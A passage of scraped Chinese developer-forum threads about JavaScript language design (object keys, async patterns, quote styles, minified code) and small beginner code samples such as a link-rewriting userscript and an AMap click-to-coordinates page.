map的key必须固定类型不能像es6那样动态。你看都实现静态类型的map了，为什么不实现一个运行时动态类型作key和value的map呢？\r", "\r", "回到JS，Js里面那个一直没说自己是map，只是object而已，key只是作为property name，对应到C++就是成员名，C++成员名为什么只能是一个symbol呢（连字符串都不是）？你看把它设计成一个map也未尝不可不是吗？\r", "\r", "然而这有意思吗……你在学习的是JS而不是C++……", "1. key是uuid本来就是哈希表算法的基础，hash函数就应该是自己设计的。Java里边你要让一个对象是hashable的，也得写hash函数。\r", "\r", "2. 和collection相关的处理统一用lodash或者underscore来处理。_.map(collection, function(value, key) {...} ) 一点问题没有。本来forIn就不在《the good parts》里边。\r", "\r", "3. split提供默认值的话，你难道不会骂娘说为什么要默认成这样，我让你默认是逗号了么？在多数场景下反而会提高debug的难度。不指定separator就默认为undefined，字符串里没有undefined就分不开，返回自己有什么问题么。\r", "\r", "4. 针对第一个需求，如果真的想优雅实现的话。可以自己将普通的hash封装一个hash类，要加入新的键值对时首先调用键的hash函数求出字符串型的uuid，再存入普通hash中，注意处理碰撞，因为js没有链表，应该只能用闭散列。取的时候也调用键的hash函数算一下，再找。\r", "\r", "任何一项特性的引入都会伴随着复杂度的提升。我用python的时候就会觉得，卧槽干嘛简简单单一个字符串要搞这么多编码，卧槽干嘛数据库里边查出来一个数字序列化成json会报错（decimal is not serializable）。这些东西你想想都有道理，因为本来字符串就是bytes+encoding，默认采用utf8或者ascii都犯了过于主观的错误。decimal作为高精度数字类型确实和普通的float/int是不一样的。但是这些人为引入的复杂度对解决问题起到任何帮助了么？想想有多少时间是浪费在处理这种事情上，而不是真正的业务逻辑上了。\r", "\r", "比方说泛型，你觉得map<string, Any>是一个特例，那其实根据scala的思想，没有对类型推演的逆变和协变，泛型也是不够完整的，即便是map<any, any>也是不够泛化的。(http://www.tuicool.com/articles/vaAnmq)\r", "\r", "关于比较，我就问一声，各位大神什么时候会在自己的程序里边写出这样的代码？有多少时候是因为语言设计的缺陷导致自己调了几天bug的？\r", "\r", "我个人的观点是：Javascript有很多傻逼的地方，但是只用到(http://book.douban.com/subject/2994925/)的话，它就已经是一门伟大的语言了。", "Object 本意并不是用作 hash，它的坑太多了，所以才会在 ES6 中引入 Map。\r", "for in 也是，当初设计太不周到，所以引入 for of （for of 涉及到了 iterator，完全是另起炉灶的感觉，在概念上其实不能与 for in 类比了……）。现在一般用 for k of Object.keys(obj) 而不是 for in 了。\r", "\r", "另外同意楼主说的，ES6 之前的 JS 真不好用……", " 因为运行时动态类型的map在C++中实现要比实现一个静态类型的难。而Js里，原本的实现我觉得已经可以做到传个对象进去当key了。一个是还要很多的工作，一个是限制和不限制。所以我吐槽的是设计而不是实现。对，他本质是个obj。这是实现。但是设计上，他是个k,v map。\r", "\r", " > 在多数场景下反而会提高debug的难度。不指定separator就默认为undefined，字符串里没有undefined就分不开，返回自己有什么问题么。 \r", " 我觉得挺有问题的，字符串里没有undefined应该告诉我不能对字符串找一个叫underfined的字符。\r", " 拉链法和链表没有什么卵关系。Scala那段没懂你想表达什么，map<string, V> 本来就是 map<K,V>的一个特例，和你后面说的没什么关系。", "其实是因为你没有告诉他，它没有义务给你一个它觉得是对的分隔符。\r", "\r", "Scala那段是描述对于泛型还可以有泛型，我想表达的是，如果真的要引入泛型可以没有边界，这是一个设计选择，大多数场景下足够好用，你想要的那个需求要实现起来也很容易。\r", "\r", "拉链法就是用链表来解决哈希值冲突的情况，在所有有指针的语言里用链表实现，在没有指针的语言里用数组模拟链表实现.... \r", "\r", "唉，不知道说什么了，对于一些人来说太阳大概是会从东边落下的吧。", " 你这个能传对象做 key 也太想当然了吧……首先你觉得用对象做 key 容易？原本人家的对象只需要是个字符串做 key 的 hashmap，所以只要实现字符串有序比较就可以了，现在可好，什么类型都可以了，那你说boolean 的 true和字符串\"true\" 和 new String(\"true\")要不要是同一个 key？不是的话谁大谁小？然后a[1]和 a[\"1\"] 是不是就要分开了？要考虑的事情一大堆你就一句“原本就可以”啊，什么叫做限制……用 string 做 key 其实就是简单而且也够用而已，那个时候对 JS 没多少需求，有了需求才设计了 map 这东西，然后你可以去看看 Es6的 spec，这 map 根本连个 hashmap 都不是，性能完全不能和 object 比好吧……\r", "\r", "说实话我觉得你这种抱着一种语言的观念去学另外语言的习惯非常不好，别的设计有别的设计的理由（虽然有些是失误比如 typeof null），抱着这种先入为主的观念不是一个学习其他语言的好态度。", " 我可不觉得是字符串的有序比较。我传个长度为10000的字符串key他还真给我去比较了?我宁可相信内部是hash的。你在说到谁大谁小的时候已经默认是RB树实现的map了。可是我觉得这么应该是hashmap\r", " 但是它有义务Fail Fast。 那比map<K,V>更泛型的是？ 直接数组实现就行了，何必数组模拟链表。", " >那你说boolean 的 true和字符串\"true\" 和 new String(\"true\")要不要是同一个 key？不是的话谁大谁小？然后a[1]和 a[\"1\"] 是不是就要分开了？\r", "===号返回true的，hash值相同，返回false的，hash值不同（先不去管冲突）。能做到判断===，也就能做到hash。\r", ">说实话我觉得你这种抱着一种语言的观念去学另外语言的习惯非常不好，别的设计有别的设计的理由（虽然有些是失误比如 typeof null），抱着这种先入为主的观念不是一个学习其他语言的好态度。\r", "这段我认同，只是coding的时候不能抱着先入为主的观念。但是在理解设计的时候，你无法不抱着先入为主的观念，不然如何去比较设计的思想呢。", " 那同样问题就是怎么设计hash算法了。各种类型都要做hash和互相比较大小没有难度上的区别（都不容易）。", " 今天仔细想了下这个问题，感觉 JS 的这种设计还是有道理的：\r", "1. 非要说的话，object 其实可以用其他类型作为键值，只是在使用前会调用 toString 而已……可以理解为这里将 toString 作为一个最偷懒的 hash 方法来用了。要是有人愿意的话，重写一下 Object.prototype.toString 就能实现「任意类型作键值」的功能了嘛；\r", "2. 考虑到 object literal 的写法，要是允许键值为任意类型，似乎会很脏……现在只允许 string 的话好看很多（可以参考 ES6 computed property names 的写法，真的挺难看的……而且不能用 JSON 表示了）。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>不废话，上代码。依赖Jquery</p>\n<div class=\"highlight\"><pre><span class=\"nx\">$</span><span class=\"p\">(</span><span class=\"s1\">'#content a[href]'</span><span class=\"p\">).</span><span class=\"nx\">each</span><span class=\"p\">(</span><span class=\"kd\">function</span> <span class=\"p\">()</span> <span class=\"p\">{</span>\n  <span class=\"nx\">$this</span> <span class=\"o\">=</span> <span class=\"nx\">$</span><span class=\"p\">(</span><span class=\"k\">this</span><span class=\"p\">);</span>\n  <span class=\"kd\">var</span> <span class=\"nx\">href</span> <span class=\"o\">=</span> <span class=\"k\">this</span><span class=\"p\">.</span><span class=\"nx\">href</span><span class=\"p\">;</span>\n  <span class=\"nx\">$this</span><span class=\"p\">.</span><span class=\"nx\">attr</span><span class=\"p\">(</span><span class=\"s1\">'href'</span><span class=\"p\">,</span> <span class=\"s1\">'http://webcache.googleusercontent.com/search?q=cache:'</span> <span class=\"o\">+</span> <span class=\"nx\">href</span><span class=\"p\">);</span>\n<span class=\"p\">});</span>\n</pre></div>\n</div></div>"], "reply": "9", "tittle": "刚刚随手写了一个猴子脚本，把 google 网页快照里面的所有链接全部转换成网页快照的链接", "comment": ["不懂,怎么用", " 火狐搜 GreaseMonkey, Chrome 搜 TamperMonkey", "Array.prototype.slice.call(document.querySelectorAll(\"a[href]\")).forEach(function(element, index, array) {element.href = '", "' + element.href;});\r", "\r", "改版为无依赖", " 为啥不 Array.prototype.forEach.call 呢（", " 因为我没系统了解过这些东西，都是遇到问题，寻找解决方案这样的。。。。\r", "\r", "Array.prototype.forEach.call(document.querySelectorAll(\"a[href]\"), function(element, index, array) {element.href = '", "' + element.href;});", " \r", "\r", "不错。/w\\", "求个完整版的 user.js  脚本。谢谢。。", " \r", "\r", "\r", "\r", "这里", " \r", "\r", "还是有依赖，不过这次用的方式更聪明了……不直接改链接了，而是劫持链接。虽然这样做有个问题，就是如果右键打开的话就会出问题了……\r", "\r", "\r", "\r", "// ==UserScript==\r", "// @", "        快照链接\r", "// @", "   lovearia.me\r", "// @", " 把谷歌快照的链接全部转换成谷歌快照\r", "// @", "     ", "\r", "// @", "     2\r", "// @", "       none\r", "// @", "     ", "\r", "// ==/UserScript==\r", "\r", "$('body').on('click', 'a[href]', function (e) {\r", "  if (!$(this).closest('#google-cache-hdr').length) {\r", "    var href = '", "' + escape(this.href);\r", "    location.href = href;\r", "    e.preventDefault();\r", "  }\r", "});"]},
{"content": ["<div class=\"topic_content\">一个promise+async语句，一个generator，本来要摆脱callback hell是好的，但一下子来俩就有点重复了吧，都不知道要用哪个好了，选择太多也是累。\r<br>\r<br>\r<br>py3就只有一种，现在v3.4的用generator，v3.5加一个async语法糖，做一件事只用一个方法。</div>"], "reply": "28", "tittle": "js 为什么一下子要上马二个语言级异步转同步方案", "comment": ["> 一个promise+async语句，一个generator\r", "\r", "they are different", "generator 本身不是为了把异步转同步诞生的，如果是的话，应该会直接叫 Fiber/Coroutine 而不是 generator\r", "generator 本身是一个 semi corountine，当然使用一些模式，也是可以达到类似效果的。", "如果你能搜索 ", " 我就是说这二个是不同的啊，但可以达到一样的以同步方式写异步逻辑的效果。\r", "\r", " 但generator同时也是最好的转同步方案啊，发明一样东西又不是一定要限制在最原始的用法上，你看python的语言级转同步支持就是基于generator的。", "1. generator 并不是为了处理异步而引入的，只是恰好可以用来这么做而已；\r", "2. async/await 是 ES7，promise 和 generator 是 ES6，并不同时；\r", "3. async/await 只是语法糖，它能做到的事用 promise + generator 也一样行，它只是把 spawn 函数包装了下看起来好看点而已。", " ES6不是刚刚才标准化的嘛，标准化之前generator提案也早有了，在没放进标准前从别的语言抄了个更好的方案来后不是应该一脚踢开原先的吗，一但放进标准以后再也没机会去掉了。 当然你要说Promise在JS上古时代就有了，一直在发展，现在好不容易可以转正了就别把之前的努力白费了(来都来了）。\r", "\r", "我的意思是说同样功能的选择越少越好，只选一个最佳的，特别是在语言级的标准上，Python 3.5也有async语法糖，但它是基于generator的，也就是说python只用一套方案就能达到js二套的效果。", " 没懂你说的……generator 是基础设施，不仅限于异步处理，肯定不能丢，async/await 得基于 Promise，后者自然也不能少（对了，你说的 generator 处理异步，也是得和 Promise 一起用的）。标准化需要时间，所以一步一步来，先打好基础，语法糖后续再加。\r", "\r", "JS 里的 async/await 本质上就是基于 generator + Promise 的，跟你说的 Python 一套方案达成两个效果有区别吗……\r", "\r", "以及这里有篇 Does async/await solve a real problem? 可以看一下 ", " 我说的是generator能做的事情不知道多到哪里去了。怎么能去？\r", "但你要是用generator直接async吧，难度有点高，写成库吧，也可以。所以你的问题应该是：为什么async不用generator实现？", "1. promise是异步统一接口\r", "2. generator中的async generator“正好”可以搞异步\r", "3. async接口层面用promise，实现层面用generator\r", "\r", "generator是很好的异步转同步方案，但并不是“最好”的，就说几个最基本的缺点\r", "\r", "1. promise可以通过继承等手段加上额外的逻辑，比如xhr.abort()，generator要这么做得用observer，整个接口都不直观了\r", "2. generator对外表现的形式是“未知有多少东西”，promise则明确“有一个结果”，用generator去表达异步会让人很尴尬，到底要不要判断done呢，后面会不会有别的东西呢，没有足够的表意性", "应该是两个而不是二个吧", "真正异步等 async 吧。generator 的实现调试起来简直就是地狱。", " 用generator来表示统一接口也没有什么不好，至少没必要到用二套基本底层异步接口。\r", "\r", "你所有缺点：\r", "1. 没理解你的例子。\r", "2. generator无数据了/运行完成了表示done有什么不好判断呢？", "所以说前端不是那么简单的。\r", "而且 await 、promise 这么简单地模式很难理解么", " 终于看到这个槽点了", " async没不是一定要Promise，接在generator也可以，而且实现更简单，几乎就是个语法糖。\r", " 具体什么情况？我用python的基于generaotr的asyncio写了几千行代码没有发现有调试问题。\r", " 你是不是看错题了？", " ……你真的看了那几个用 generator 的库实现异步的原理么…… 然后你写点复杂的程序，开始调试的时候就明白痛苦在哪了。", " 题外话", "结贴吧我知道为什么了。\r", "\r", "\r", " 我说了promise很难？另外promise虽简单但你不用async直接手写promise代码同样是陀屎，一样会把逻辑分隔得很不直观。", " 在我看来“表意性”和“能用”同样重要，promise明确表达是“做一件事，只有成功和失败2种结果”，而generator没法表达这个概念，或者说generator承载的概念太多导致使用者拿到一个generator function的时候无法确定它是不是正在表达着“做一件事”这个概念\r", "你的思路在前端看来类似于“只要div就能做网页了还要其它元素干啥”……", " 没说你说过，我只说想表达JS很复杂了已经。新加的语法只会徒增概念。", " 我倒是觉得从表意性上generator也说得过去。yield可以看作异步return，和有同步return的函数互补，比生造一个Promise概念上更简单，只是和同步return不同的是表面上返回的是个数据list而不是return的单个数据，但这个差别很小，一点点不完美而已，python这么追求完美的语言还不是用generator来作为异步底层。", "两个不是马上出来的 generator是es6里的，很早就有。async是es7里的，最近才有", " 明白了，你是在说有了 generator 后不需要 promise？\r", "这里有段话可以解释 ", "\r", "What generators do not do is give us a way of representing the result of an asynchronous operation. For that, we need a promise.", " 我觉得 generator 的语义更倾向于 lazy sequence 吧……用在异步稍微牵强了点，不过这不是重点。\r", "另外 Promise/Future 的概念并不是生造的，很多其他语言也有啊 ", "\r", "\r", "除了这些，我个人还觉得 Promise 比较有用的一点是它可以很容易地被 polyfill……这在前端很重要。", " 对啊我就是这个意思，yield本身是个很通用的概念，同时包含lazy/异步/数据流语义，用它来作同步化方案也是可行的且不用让大家再学promise了，你看人家python这么做没什么不好的地方，也让大家少点学习负担。当然现在看来js语言本身根本没有想要用generator来做同步化方案而是完全用promise，本来手写promise体验很渣，但加上async语句后和generator方案有一拼了，所以用promise方案也不能说不好。", " 你为啥要说“二个语言级异步转同步方案”呢？这个说法就不对啊，为什么 yield 就被对号入座了呢？这个官方有推荐这种用法吗？ES 的作者们都没这么说。只是有些人比如 TJ， hack 了一下 yield 的一种特性而已，而且被很多一知半解的人宣传的变了味道。\r", "\r", "换个说法，我能用 swich case 完成全部的 yield 的功能，那是不是说 switch case 能算第三种 异步语法了呢？很多方法都是能简化异步问题的，哪止一两种，即使是 callback，不谈 js，即使在 C 编程刚流行这个概念的时候也是解决很多棘手的异步问题的，只不过随着时间的推移需求变得更复杂了，人们又开始寻找能解决当下问题的工具而已。\r", "\r", "我敢说用不了几年当 async await 被大量使用后，人们能解决更多更复杂问题的时候又会有新的语法被发明出来。不说未来，即使是现在就有很多玩转了 yield async await promise 开始抱怨它们的总总问题了。有兴趣的话，可以去 MDN 订阅个 mailing list 看看业内人士们是如何讨论未来的，最近两天就有几个哥们一直在讨论 async 的各种问题。", "你知道JS这类语言的实质都是——啰嗦。还记得null 跟 undefined 不？\r", "\r", "老老实实给个 coroutine 实现不好么，为毛要搞出三个幺蛾子呢。", "Generator可以直接使用try catch，哪来的调试坑\r", "\r", "爱用Promise就Promise，爱用Generator就Generator，这有什么争得"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>html code :<code>&lt;input type=\"text\"&gt;&lt;span&gt;老王&lt;/span&gt;</code><br>\n在input内输入111那么在span内就显示老王<br>\n输入222就显示老张<br>\n输入333就显示老周<br>\n输入其它数字则显示没有对应数值</p>\n\n<p>请各位帮我看看这段js代码怎么写？</p>\n</div></div>"], "reply": "2", "tittle": "js 怎样获取 input 的值返回对应的数据", "comment": ["就是侦听<input>的事件嘛，根据用户输入修改<span>里的文本。\r", "随便写了一下，小白，轻拍： ", " （图省事引用了jQuery库）\r", "\r", "PS: 一楼什么鬼……"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>已经不想看度娘给出的东西了<br>\n乱七八糟都不止痒</p>\n\n<p>谁能给出一个简单的结论<br>\n我好混乱啊</p>\n</div></div>"], "reply": "32", "tittle": "JavaScript 的双引号，单引号，到底是啥情况？（已晕的撞墙，快来救救我）", "comment": ["我记的没错的话。。。。貌似单双引号一样？\r", "\r", "我之前一直用的双引号，因为平时打字手顺了\r", "一年没写，现在整天写SQL，又全能单引号了。。。\r", "记忆混乱了", "单引号里能用双引号，双引号里能用单引号", "想用啥用啥", "等价的.. 个人习惯用单引号，好处大概有：\r", "1. 字符串里面写html可以直接双引号不用转；\r", "2. 少按shift...", "单引号内转义有一定限制", "没有区别，基本不用双", "没区别，一般推荐是使用单引号", "如果是针对string的话，没区别。 我都混着用", "没区别，JS 单引号，HTML/CSS 双引号", " 简单明了", "没啥区别\r", "注意手写拼接的话转义下\\", "\"\" = ''\r", "\"a\" = 'a'\r", "\"\\\"\" = \"\r", "\"\\'\" = '\r", "'\\'' = '\r", "\"\\'\" = '\r", "\"''\" = ''\r", "'\"\"' = \"\"", " 和你想的一样，少一个键效率上去了", "基本一样的，JSON明确说明只能用双引号", " 最后两行左值完全看不清😂", " 就是字符串里面是：''", "语法明确规定必须用双引的就用双引，其他全单引，个人规则，仅供参考", " +1", "javascript没有字符类型，所以", "没有区别", "为了减少转义的话,就两个都用", "优先使用单引号，可以在HTML中直接调用\r", "\r", "有试过，一般不引起歧义的都可以通用", "优先使用单引号。\r", "\r", "主要在项目里保持一直就行了。", "单引号看起来比双引号要清晰的多 因为只有一个' 而且需要用到双引号做字符的时候,不用去转义.", " @", "  效率点单引号 +1", "一般来说静态编译器或者语法检查器会提示你优先用单引号包围所有的字符串。。除非你需要在单引号里面用单引号", "单引号好看多了", "我本人是用单，有时候不小心打了双。随便吧", "真心喜欢单引号，最简单理由：不用按 Shift。", "1、单引号和双引号一样的，没有任何区别，不会像PHP之类的语言出现解析不同的情况（备注：我不懂PHP的，记得在网上还是书上看过这个，说是没有任何区别，和PHP不一样）\r", "2、单引号和双引号用的时候，记得一个点就行了，就是一对单引号之间不能出现单引号，如果必须出现单引号，需要用转义字符 [\\] 来转义下；双引号同理；\r", "3、JSON格式的字符串，必须要双引号；\r", "目前关于单引号和双引号这个，只能想到这三点；", "单引号双引号同义 不过建议使用单引号 因为某些类型的代码双引号是有意义的 比如coffee"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p><a target=\"_blank\" rel=\"nofollow\" href=\"http://i.imgur.com/hoDObY5.png\">http://i.imgur.com/hoDObY5.png</a></p>\n</div></div>"], "reply": "22", "tittle": "为什么 js 的代码看起来特别复杂？", "comment": ["这是加密压缩过的js代码。", "这是人写的代码？", "丑化过了", "这个是压缩过的代码，写绑定事件之类的功能；你可以在d前面敲一个回车，看起来就更清爽了；d.prototype.XXXX是在d的原型上写方法；里面的this关键字，是指谁执行这个方法，this就指谁，没有执行前只是一个空指针；其实你只要理清思路，然后看这个代码就并不复杂的了；你可以试着模仿jQuery写自己的类库；最多写几十个方法，然后找个压缩工具，压缩自己的类库；然后你再解读你自己的类库；你会非常容易就能看懂自己压缩后的类库（自己写的，自己当然能看懂）；再然后你回头看下这段代码，你会发现，就那么点东西；你发的这个图应该是在控制台，点展开后截图下来的，你可以复制到webstorm里再看；也能帮助你理解的；", "用chrome dev tools打开，按下美化键", "还真不像 uglify 之后的，还真像人写的...\r", "好多变量名函数名都没改，短变量名选择的字母看起来也像是有意义的，比如 markerSize: {w: 23, h:35}", " 是提供给外部的接口吧。函数内变量都abcde了，应该是uglify后的产物", " 这个当然丑化过了。变量成员名为了防止代码出错没有缩短。\r", "\r", "顺便告诉你们这是 leaflet.js 里面的代码片段，不要问我怎么看出来的……", "好吧应该是腾讯地图？ - -", " var a,b,c;谁这么写代码会被队友打死的", "因为这是压缩后的代码......", "变量名替换为简单字符，起到了压缩和混淆的目的", " \r", " \r", "压缩过的能解压缩吗？", " 当然不能了，只能美化下格式。", " 貌似可以（记得以前见过JS反混淆工具），但不理想。计算机可以处理一些约定俗成的东西，但其他的就无能为力。（代码反混淆用AI，不敢想象……）\r", "但格式化一下还是很简单的，然后如果代码不很庞大的话，利用refactor工具手动解密也不是不可行。", " 不可能解压缩的......", "这是压缩和混淆过的 js\r", "\r", "减小体积和防止直接泄露代码", " \r", "\r", "明明是 饿了么ELEME", " eleme 用的腾讯地图的 API，没错啊。", "混淆了吧", "你看，你自己都说是看起来复杂，所以奋斗吧，骚年....."]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>eval(50).toFixed(2)&gt;eval(100).toFixed(2)<br>\ntrue<br>\n被当成字符串处理了？？</p>\n</div></div>"], "reply": "6", "tittle": "遇见个灵异事件", "comment": ["toFixed返回的是string，可以用typeof看一下", "var a=eval(\"50\"),\r", "        b= a.toFixed(2);\r", "        c=parseInt(b);\r", "    console.log(typeof a);//number\r", "    console.log(typeof b);//string\r", "    console.log(typeof c);//number\r", "    console.log(eval(50).toFixed(2)>eval(100).toFixed(2));//true\r", "    console.log(parseInt(eval(50).toFixed(2))>parseInt(eval(100).toFixed(2)));//false", "b= a.toFixed(2), 后面是逗号，不是分号；楼主可以把一个一个的输出来看看；", "test", "teat", " t"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>对于电脑AI一般有哪些处理方式？暂时不考虑特殊技能和效果</p>\n</div></div>"], "reply": "5", "tittle": "想用 js 做一个纯攻防的单机网页卡牌游戏 demo，不知道难度如何？", "comment": ["行胜于言", "难在逻辑，不在技术上", "以前搞过游戏么？", " 没有", "岂止于大"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>客户提供的资料没有具体接口，仅提供如下两个链接。</p>\n\n<h1>如下</h1>\n\n<p>本接口仅用于测试 测试没问题后，请联系我，我提供正式的服务地址</p>\n\n<p><a target=\"_blank\" rel=\"nofollow\" href=\"http://218.58.61.50:6080/arcgis/rest/services/QD/YXQP/MapServer\">http://218.58.61.50:6080/arcgis/rest/services/QD/YXQP/MapServer</a></p>\n\n<p>示例：<br>\n<a target=\"_blank\" rel=\"nofollow\" href=\"http://218.58.61.50:6080/arcgis/rest/services/QD/YXQP/MapServer?f=jsap\">http://218.58.61.50:6080/arcgis/rest/services/QD/YXQP/MapServer?f=jsap</a>...</p>\n\n<h1>如上</h1>\n\n<p>需要点击地图某点，返回坐标。</p>\n\n<p>有了解arcgis的朋友帮忙看下，万分感谢！</p>\n</div></div>"], "reply": "2", "tittle": "arcgis 获取坐标点 的问题", "comment": ["   拿去。", "<!DOCTYPE HTML>\r", "<html>\r", "<head>\r", "\t<meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\">\r", "\t<title>地图初始加载定位到当前城市</title> \r", "\t<style type=\"text/css\">\r", "\t\tbody{\r", "\t\t\tmargin:0;\r", "\t\t\theight:100%;\r", "\t\t\twidth:100%;\r", "\t\t\tposition:absolute;\r", "\t\t}\r", "\t\t#mapContainer{\r", "\t\t\tposition: absolute;\r", "\t\t\ttop:0;\r", "\t\t\tleft: 0;\r", "\t\t\tright:0;\r", "\t\t\tbottom:0;\r", "\t\t}\r", "\t\t\r", "\t\t#tip{\r", "\t\t\theight:45px;\r", "\t\t\tbackground-color:#fff;\r", "\t\t\tpadding-left:10px;\r", "\t\t\tpadding-right:10px;\r", "\t\t\tborder:1px solid #969696;\r", "\t\t\tposition:absolute;\r", "\t\t\tfont-size:12px;\r", "\t\t\tright:10px;\r", "\t\t\tbottom:20px;\r", "\t\t\tborder-radius:3px;\r", "\t\t\tline-height:45px;\r", "\t\t}\r", "\t</style>\r", "</head>\r", "<body>\r", "\t<input type=\"hidden\" id=\"lngX\" name=\"lngX\" value=\"\"/>\r", "    <input type=\"hidden\" id=\"latY\" name=\"latY\" value=\"\"/>\r", "     \r", "\t<div id=\"mapContainer\"></div>\r", "\t<div id=\"tip\">  \t\t\r", "\t\t<div id=\"info\"></div>\r", "\t</div>\r", "\t\r", "\t<script type=\"text/javascript\" src=\"http://webapi.amap.com/maps?v=1.3&key=94130b7d9999d8e1e1146a711955f2b3\"></script>\r", "\t<script type=\"text/javascript\">\r", "\t\t//初始化地图对象，加载地图\r", "\t\t////初始化加载地图时，若center及level属性缺省，地图默认显示用户当前城市范围\r", "\t\tvar map = new AMap.Map('mapContainer', {\r", "\t\t\tresizeEnable: true,\r", "\t\t\tview: new AMap.View2D({\r", "\t\t\t\t//center: new AMap.LngLat(116.397428, 39.90923),\r", "\t\t\t\tzoom: 13\r", "\t\t\t})\r", "\t\t});\r", "\t\t//地图中添加地图操作ToolBar插件\r", "\t\tmap.plugin(['AMap.ToolBar'],function(){\r", "\t\t\t//设置地位标记为自定义标记\r", "\t\t\tvar toolBar = new AMap.ToolBar(); \r", "\t\t\tmap.addControl(toolBar);\t\t\r", "\t\t});\r", "\t\t\r", "\t\t\r", "\t\t\r", "\t\t//为地图注册click事件获取鼠标点击出的经纬度坐标\r", "\t\tvar clickEventListener=AMap.event.addListener(map,'click',function(e){\r", "\t\t\tdocument.getElementById(\"lngX\").value=e.lnglat.getLng();\r", "\t\t\tdocument.getElementById(\"latY\").value=e.lnglat.getLat();  \r", "\t\t\tgeocoder();\r", "\t\t});\r", "\t\t\r", "\t\t\r", "\t\t\r", "\t\t\r", "\t\t\r", "\t\t//已知点坐标\r", "\t\tfunction geocoder() {\r", "\t\t\t//var lnglatXY = new AMap.LngLat(116.396574,39.992706);\r", "\t\t\t//alert(document.getElementById(\"lngX\").value);\r", "\t\t\t//alert(document.getElementById(\"latY\").value);\r", "\t\t\tlngX = document.getElementById(\"lngX\").value;\r", "\t\t\tlatY = document.getElementById(\"latY\").value;\r", "\t\t\t//alert(lngX);\r", "\t\t\t//alert(latY);\r", "\t\t\tvar lnglatXY = new AMap.LngLat(lngX,latY);\r", "\t\t    var MGeocoder;\r", "\t\t    //加载地理编码插件\r", "\t\t    AMap.service([\"AMap.Geocoder\"], function() {        \r", "\t\t        MGeocoder = new AMap.Geocoder({ \r", "\t\t            radius: 1000,\r", "\t\t            extensions: \"all\"\r", "\t\t        });\r", "\t\t        //逆地理编码\r", "\t\t        MGeocoder.getAddress(lnglatXY, function(status, result){\r", "\t\t        \tif(status === 'complete' && result.info === 'OK'){\r", "\t\t        \t\tgeocoder_CallBack(result);\r", "\t\t        \t}\r", "\t\t        });\r", "\t\t    });\r", "\t\t    //加点\r", "\t\t\tmap.clearMap();\r", "\t\t    var marker = new AMap.Marker({\r", "\t\t        map:map,\r", "\t\t        icon: new AMap.Icon({\r", "\t\t            image: \"http://cache.amap.com/lbs/static/jsdemo001.png\",\r", "\t\t            size:new AMap.Size(58,30),\r", "\t\t            imageOffset: new AMap.Pixel(-32, -0)\r", "\t\t        }),\r", "\t\t        position: lnglatXY,\r", "\t\t        offset: new AMap.Pixel(-5,-30)\r", "\t\t    });\r", "\t\t    map.setFitView();\r", "\t\t}\r", "\t\t//鼠标划过显示相应点\r", "\t\tvar marker;\r", "\t\tfunction onMouseOver (e) {\r", "\t\t    var coor = e.split(','),\r", "\t\t        lnglat = new AMap.LngLat(coor[0], coor[1]);\r", "\t\t    if (!marker) {\r", "\t\t        marker = new AMap.Marker({\r", "\t\t            map:map,\r", "\t\t            icon: \"http://webapi.amap.com/images/0.png\",\r", "\t\t            position: lnglat,\r", "\t\t            offset: new AMap.Pixel(-10, -34)\r", "\t\t        });\r", "\t\t    } else {\r", "\t\t        marker.setPosition(lnglat);\r", "\t\t    }\r", "\t\t    map.setFitView();\r", "\t\t}\r", "\t\t//回调函数\r", "\t\tfunction geocoder_CallBack(data) {\r", "\t\t    var resultStr = \"\";\r", "\t\t    var poiinfo=\"\";\r", "\t\t    var address;\r", "\t\t    //返回地址描述\r", "\t\t    address = data.regeocode.formattedAddress;\r", "\t\t    //返回周边兴趣点信息\r", "\t\t    //for(var j=0;j<data.regeocode.pois.length;j++){\r", "\t\t    for(var j=0;j<1;j++){\r", "\t\t        var color = j % 2 === 0 ? '#fff' : '#eee';\r", "\t\t        //poiinfo += \"<tr onmouseover='onMouseOver(\\\"\" + data.regeocode.pois[j].location.toString() + \"\\\")' style='background-color:\" + color + \"; margin:0; padding:0;'><td>\" + data.regeocode.pois[j].name + \"</td><td>距离：\" + data.regeocode.pois[j].distance + \"米</td></tr>\";\r", "\t\t\t\tpoiinfo += \" \" + data.regeocode.pois[j].name + \" 距离：\" + data.regeocode.pois[j].distance + \"米\";\r", "\t\t    }\r", "\t\t    //返回结果拼接输出\r", "\t\t    resultStr = \"地址：\"+ address + \" \" + poiinfo +\" \";\r", "\t\t    document.getElementById(\"info\").innerHTML = resultStr;\r", "\t\t}\r", "\t</script>\r", "</body>\r", "</html>"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>我需要用js动态生成一组页面ui，用jquery.html(这里需要一大串html代码，太恶心了)，有没有方便的库可以实现这个功能？</p>\n</div></div>"], "reply": "49", "tittle": "有没有用 js 创建 dom 的库", "comment": ["你可以用前端模版引擎", "你可以试一下underscore.js", "话说怎么着你都要写一堆html代码。不管自己拼字符串还是用模版引擎(模版引擎说白了就是用一些语法糖来帮你拼字符串...)（会不会有人说用jade不算html...）\r", "总不能你每个createElement吧...", "可以使用ExtJS，他所有ui都是用js生成的，可是有些太重了，不知是否符合你的需求。前端模板引擎也是个不错的方式，比如template.js", "react jsx :D", "react.js+1", "Angular.js 也可以动态渲染模板", "最简单就是用 underscore.js 中的 _.template()", "模版引擎都有这功能，支持外部文件引用", "react+2", "如果是表格之类的话可以考虑 angular 渲染", "react+3", "react +4\r", "\r", "rivets +1\r", "jsblocks +1\r", "riot +1", " 只有每一个都createElement过的人，才能体会为什么react比较好，怎样渲染dom效率高。\r", "\r", "不然一开始就用一些类库渲染，永远不知道哪种东西好，为什么好。", " - -. 归根到底，生成节点就只有createElement然后往里插 和 innerHTML... 其他没有了(而且现在的浏览器优化程度还不知道谁效率高，各个浏览器不一样)。react mount的时候一样是innerHTML。 innerHTML 怎么着都方便一些还能避免浏览器的一些报错。\r", "\r", "怎么简单怎么来。所以用拼字符串，还是用模版引擎生成，还是用react这样的大框架。要看po主的上下文环境。不能一棍子拍死。\r", "\r", "就比方我就出门打个酱油，是坐飞机呢，还是做汽车呢，还是自行车呢，还是走路呢...", " 